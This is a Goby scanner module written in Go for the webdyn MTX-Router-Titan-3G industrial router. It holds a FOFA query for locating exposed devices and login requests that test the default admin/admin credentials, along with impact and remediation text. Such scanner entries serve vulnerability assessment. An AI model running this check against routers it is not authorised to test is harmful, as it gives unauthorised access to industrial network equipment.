package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "webdyn-MTX-Router-Titan Default Password",
    "Description": "<p>The MTX-Router-Titan is an industrial router with a complete wireless/wired interface, so no additional hardware components are required.</p><p>MTX-Router-Titan router web management interface has a default password of admin/admin</p>",
    "Product": "MTX-Router-Titan-3G",
    "Homepage": "https://www.webdyn.com/product/mtx-router-titan/",
    "DisclosureDate": "2022-11-21",
    "Author": "wmqfree@163.com",
    "FofaQuery": "title=\"MTX-Router-Titan-3G\"",
    "GobyQuery": "title=\"MTX-Router-Titan-3G\"",
    "Level": "1",
    "Impact": "<p>MTX-Router-Titan has a default password. Attackers can use the default password admin/admin to log in to the system background without authorization, perform other sensitive operations, and obtain more sensitive information.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, etc., and the number of digits should be greater than 8 digits.</p><p>2. If it is not necessary, the public network is prohibited from accessing the management system.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "USERNAME=admin&PASSWORD=admin&LOGIN=LOGIN"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Location: /wan-status.php",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Set-Cookie: PHPSESSID",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "USERNAME=admin&PASSWORD=admin&LOGIN=LOGIN"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Location: /wan-status.php",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Set-Cookie: PHPSESSID",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|text|admin:admin"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5",
    "Translation": {
        "CN": {
            "Name": "webdyn-MTX-Router-Titan默认口令",
            "Product": "MTX-Router-Titan-3G",
            "Description": "<p>MTX-Router-Titan 是一款具备完整的无线/有线接口的工业路由器，因此不需要额外的硬件组件。<br></p><p>MTX-Router-Titan路由器web管理界面存在默认口令admin/admin<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位数。</p><p>2、如非必要，禁止公网访问该管理系统。<br></p>",
            "Impact": "<p>MTX-Router-Titan存在默认口令，攻击者可未授权使用默认口令admin/admin登录系统后台，执行其他敏感操作，获取更多敏感信息。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "webdyn-MTX-Router-Titan Default Password",
            "Product": "MTX-Router-Titan-3G",
            "Description": "<p>The MTX-Router-Titan is an industrial router with a complete wireless/wired interface, so no additional hardware components are required.</p><p>MTX-Router-Titan router web management interface has a default password of admin/admin</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, etc., and the number of digits should be greater than 8 digits.</p><p>2. If it is not necessary, the public network is prohibited from accessing the management system.</p>",
            "Impact": "<p>MTX-Router-Titan has a default password. Attackers can use the default password admin/admin to log in to the system background without authorization, perform other sensitive operations, and obtain more sensitive information.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
